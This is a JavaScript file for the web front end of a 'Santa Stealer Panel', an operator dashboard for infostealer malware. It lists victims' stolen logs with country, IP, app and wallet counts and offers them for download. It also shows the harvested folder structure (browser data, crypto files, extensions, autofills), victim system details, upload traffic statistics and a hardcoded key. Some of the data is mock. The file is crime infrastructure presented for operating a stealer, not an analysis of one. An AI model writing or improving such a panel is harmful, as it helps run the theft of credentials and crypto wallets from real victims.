// Santa Stealer Panel - JavaScript Logic

// Tab switching
function switchTab(tabName) {
    // Update sidebar
    document.querySelectorAll('.sidebar-item').forEach(item => {
        item.classList.remove('active');
    });
    event.target.closest('.sidebar-item').classList.add('active');
    
    // Update content
    document.querySelectorAll('.tab-content').forEach(content => {
        content.classList.remove('active');
    });
    document.getElementById('content-' + tabName).classList.add('active');
    
    // Update page title
    const titles = {
        'dashboard': 'Dashboard',
        'logs': 'Stealer Logs',
        'build': 'Data Collection Structure',
        'traffic': 'Traffic Analytics',
        'account': 'Account Information'
    };
    document.getElementById('page-title').textContent = titles[tabName] || tabName;
    
    // Load tab data
    switch(tabName) {
        case 'dashboard':
            loadDashboard();
            break;
        case 'logs':
            loadLogs();
            break;
        case 'build':
            loadBuildStructure();
            break;
        case 'traffic':
            loadTrafficStats();
            break;
        case 'account':
            loadAccountInfo();
            break;
    }
}

// Utility functions
function formatBytes(bytes) {
    if (bytes === 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return (bytes / Math.pow(k, i)).toFixed(2) + ' ' + sizes[i];
}

function formatDate(dateString) {
    const date = new Date(dateString);
    return date.toLocaleString();
}

function getCountryFlag(country) {
    const flags = {
        'GB': '🇬🇧',
        'US': '🇺🇸',
        'RU': '🇷🇺',
        'DE': '🇩🇪',
        'FR': '🇫🇷',
        'CN': '🇨🇳'
    };
    return flags[country] || '🌍';
}

// Dashboard
async function loadDashboard() {
    try {
        const [filesRes, chunksRes] = await Promise.all([
            fetch('/files'),
            fetch('/chunks')
        ]);
        
        const filesData = await filesRes.json();
        const chunksData = await chunksRes.json();
        
        // Update stats
        document.getElementById('total-logs').textContent = filesData.count;
        
        const totalSize = filesData.files.reduce((sum, f) => sum + f.size, 0);
        document.getElementById('total-size-stat').textContent = formatBytes(totalSize);
        
        // Count today's logs
        const today = new Date().toDateString();
        const logsToday = filesData.files.filter(f => {
            return new Date(f.modified).toDateString() === today;
        }).length;
        document.getElementById('logs-today').textContent = logsToday;
        
        document.getElementById('active-uploads-stat').textContent = Object.keys(chunksData.active_uploads).length;
        
        // Recent activity
        const recentDiv = document.getElementById('recent-activity');
        if (filesData.files.length === 0) {
            recentDiv.innerHTML = '<p class="text-gray">No recent activity</p>';
        } else {
            const recent = filesData.files.slice(0, 5);
            recentDiv.innerHTML = recent.map(file => `
                <div style="padding: 12px; background: rgba(0,0,0,0.2); border-radius: 8px; margin-bottom: 8px; display: flex; justify-content: space-between; align-items: center;">
                    <div>
                        <div style="font-weight: 600;">${file.name}</div>
                        <div style="font-size: 12px; color: #9ca3af;">${formatDate(file.modified)} • ${formatBytes(file.size)}</div>
                    </div>
                    <span class="${file.type === 'merged' ? 'text-green' : 'text-blue'}">${file.type === 'merged' ? '📦 Merged' : '📄 Single'}</span>
                </div>
            `).join('');
        }
    } catch (error) {
        console.error('Error loading dashboard:', error);
    }
}

// Logs
async function loadLogs() {
    try {
        const response = await fetch('/files');
        const data = await response.json();
        
        document.getElementById('logs-count').textContent = data.count;
        const totalSize = data.files.reduce((sum, f) => sum + f.size, 0);
        document.getElementById('logs-size').textContent = formatBytes(totalSize);
        
        const tbody = document.getElementById('logs-tbody');
        
        if (data.files.length === 0) {
            tbody.innerHTML = '<tr><td colspan="12" style="text-align: center; padding: 40px; color: #9ca3af;">No logs available</td></tr>';
            return;
        }
        
        tbody.innerHTML = data.files.map((file, idx) => {
            const country = 'GB'; // Mock data
            const ip = '158.171.23.11'; // Mock
            const apps = '2'; // Mock
            const wallets = '0'; // Mock
            const logId = file.name.split('_')[2]?.split('.')[0] || 'N/A';
            const downloads = Math.floor(Math.random() * 10); // Mock
            
            return `
                <tr>
                    <td><input type="checkbox"></td>
                    <td>${getCountryFlag(country)} ${country}</td>
                    <td style="font-family: monospace; font-size: 12px;">${ip}</td>
                    <td><span class="text-blue">📱 ${apps}</span></td>
                    <td><span class="text-green">💰 ${wallets}</span></td>
                    <td style="font-family: monospace; font-size: 11px;">${logId}</td>
                    <td>${formatBytes(file.size)}</td>
                    <td style="font-size: 12px;">${formatDate(file.modified)}</td>
                    <td><span class="text-red">test</span></td>
                    <td>None</td>
                    <td>${downloads}</td>
                    <td>
                        <button class="convert-btn" style="width: 80px; height: 30px; font-size: 11px;" data-text="⬇️" onclick="downloadFile('${file.name}', '${file.type}')"></button>
                    </td>
                </tr>
            `;
        }).join('');
    } catch (error) {
        console.error('Error loading logs:', error);
    }
}

// Build Structure
async function loadBuildStructure() {
    const folderTree = document.getElementById('folder-tree');
    
    // Mock folder structure
    const structure = [
        { icon: '📁', name: 'Chrome', color: '#fbbf24' },
        { icon: '📁', name: 'Crypto Files', color: '#fbbf24' },
        { icon: '📁', name: 'Documents', color: '#fbbf24' },
        { icon: '📁', name: 'Edge', color: '#fbbf24' },
        { icon: '📁', name: 'Extensions', color: '#fbbf24' },
        { icon: '📁', name: 'Firefox', color: '#fbbf24' },
        { icon: '📁', name: 'Important Files', color: '#fbbf24' },
        { icon: '📁', name: 'Opera', color: '#fbbf24' },
        { icon: '📁', name: 'Opera GX', color: '#fbbf24' },
        { icon: '📄', name: 'AutoFills - 31M42.txt', color: '#60a5fa' }
    ];
    
    folderTree.innerHTML = structure.map(item => `
        <div class="folder-item">
            <span style="color: ${item.color}">${item.icon}</span>
            <span>${item.name}</span>
        </div>
    `).join('');
    
    // System Info
    const systemInfo = document.getElementById('system-info');
    const sysData = [
        { label: 'Installation Path', value: 'C:\\Users\\User\\AppData\\Local' },
        { label: 'OS Architecture', value: 'x64' },
        { label: 'Hostname', value: 'DESKTOP-PC' },
        { label: 'Domain', value: 'WORKGROUP' },
        { label: 'CPU Name', value: 'Intel Core i7' },
        { label: 'CPU Cores', value: '8' },
        { label: 'RAM Size', value: '16 GB' },
        { label: 'GPU Name', value: 'NVIDIA GeForce' },
        { label: 'Operating System', value: 'Windows 10' },
        { label: 'OS Install Date', value: '2024-01-15' },
        { label: 'Username', value: 'User' },
        { label: 'Computer Name', value: 'DESKTOP-PC' }
    ];
    
    systemInfo.innerHTML = sysData.map(item => `
        <div class="info-item">
            <div class="info-label">${item.label}</div>
            <div class="info-value">${item.value}</div>
        </div>
    `).join('');
    
    // Network Info
    const networkInfo = document.getElementById('network-info');
    const netData = [
        { label: 'Network Information Report', value: 'Available' },
        { label: 'Hostname & DNS Configuration', value: 'Configured' },
        { label: 'Network Interface Analysis', value: 'Active' }
    ];
    
    networkInfo.innerHTML = netData.map(item => `
        <div class="info-item">
            <div class="info-label">${item.label}</div>
            <div class="info-value">${item.value}</div>
        </div>
    `).join('');
}

// Traffic Analytics
async function loadTrafficStats() {
    try {
        const response = await fetch('/files');
        const data = await response.json();
        
        const totalSize = data.files.reduce((sum, f) => sum + f.size, 0);
        const avgSize = data.count > 0 ? totalSize / data.count : 0;
        
        document.getElementById('traffic-total-size').textContent = formatBytes(totalSize);
        document.getElementById('traffic-avg-size').textContent = formatBytes(avgSize);
        document.getElementById('traffic-total-logs').textContent = data.count;
        
        // Date calculations
        const now = new Date();
        const today = now.toDateString();
        const weekAgo = new Date(now - 7 * 24 * 60 * 60 * 1000);
        const monthAgo = new Date(now - 30 * 24 * 60 * 60 * 1000);
        
        const logsToday = data.files.filter(f => new Date(f.modified).toDateString() === today).length;
        const logsWeek = data.files.filter(f => new Date(f.modified) >= weekAgo).length;
        const logsMonth = data.files.filter(f => new Date(f.modified) >= monthAgo).length;
        
        document.getElementById('traffic-today').textContent = logsToday;
        document.getElementById('traffic-week').textContent = logsWeek;
        document.getElementById('traffic-month').textContent = logsMonth;
        document.getElementById('traffic-avg-day').textContent = Math.round(data.count / 30);
        
        // Chunks
        const chunksRes = await fetch('/chunks');
        const chunksData = await chunksRes.json();
        document.getElementById('traffic-chunks').textContent = Object.keys(chunksData.active_uploads).length;
        
    } catch (error) {
        console.error('Error loading traffic stats:', error);
    }
}

// Account Info
async function loadAccountInfo() {
    try {
        const response = await fetch('/files');
        const data = await response.json();
        
        document.getElementById('total-builds').textContent = data.count;
        document.getElementById('successful-builds').textContent = data.count;
        document.getElementById('account-created').textContent = new Date().toLocaleDateString();
    } catch (error) {
        console.error('Error loading account info:', error);
    }
}

// Download file
function downloadFile(filename, type) {
    const path = type === 'merged' ? 'merged' : '';
    window.location.href = `/download/${path}/${filename}`.replace('//', '/');
}

// Copy key
function copyKey() {
    const key = '3eb81cc2b6ec0658e13798532a05514210d64f0488c7e5771175f5974325bae8';
    navigator.clipboard.writeText(key);
    alert('✓ Key copied to clipboard!');
}

// Select all
function selectAll(checkbox) {
    const checkboxes = document.querySelectorAll('.data-table tbody input[type="checkbox"]');
    checkboxes.forEach(cb => cb.checked = checkbox.checked);
}

// Toggle filters
function toggleFilters() {
    alert('Filters feature - Coming soon!');
}

// Auto refresh dashboard
setInterval(() => {
    const activeTab = document.querySelector('.tab-content.active');
    if (activeTab && activeTab.id === 'content-dashboard') {
        loadDashboard();
    }
}, 10000);

// Initial load
document.addEventListener('DOMContentLoaded', () => {
    loadDashboard();
});

